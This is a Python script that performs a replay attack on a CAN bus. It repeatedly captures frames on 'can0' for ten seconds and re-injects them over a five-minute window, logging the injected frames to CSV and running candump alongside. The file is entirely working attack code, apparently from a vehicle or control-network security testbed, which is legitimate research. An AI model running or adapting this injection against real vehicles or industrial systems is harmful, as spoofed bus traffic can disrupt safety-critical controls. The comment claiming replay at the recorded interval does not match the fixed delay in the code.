import can
import time
import csv
import os
from threading import Thread
from check_can_status import check_can0_status, restart_can0

# Initialize CAN interface
bus = can.interface.Bus(channel='can0', bustype='socketcan', bitrate=500000)
log = []

# Define the attack duration
attack_duration = 300  # Duration of the attack in seconds

# File to log the attack messages
attack_log_file = 'replay_attack_log.csv'

def capture_messages(duration=10):
    print("Capturing messages...")
    start_time = time.time()
    while time.time() - start_time < duration:
        message = bus.recv()
        if message is not None:
            log.append(message)
    print("Capture complete.")

def replay_messages():

    with open(attack_log_file, 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['Timestamp', 'ID', 'Data'])

        print("Replaying messages...")
        for msg in log:
            bus.send(msg)
            
            # Loging
            timestamp = time.time()
            csv_writer.writerow([timestamp, hex(msg.arbitration_id), ''.join(format(x, '02x') for x in msg.data)])

            time.sleep(0.5)  # Replay at recorded interval

            if not check_can0_status():
                restart_can0()
                # Recheck the status to ensure it is up
                if check_can0_status():
                    print("can0 is now up and running.")
                else:
                    print("Failed to bring can0 up.")


def replay_attack():
    attack_start_time = time.time()
    attack_end_time = attack_start_time + attack_duration

    while time.time() <= attack_end_time:
        capture_messages()
        time.sleep(1)  # Wait before replaying
        replay_messages()

    restart_can0()


def log_can_messages():
    os.system('candump can0 -L > replay_attack.log')


if __name__ == "__main__":

    attack_thread = Thread(target=replay_attack)
    logging_thread = Thread(target=log_can_messages)

    attack_thread.start()
    logging_thread.start()

    attack_thread.join()
    logging_thread.join()
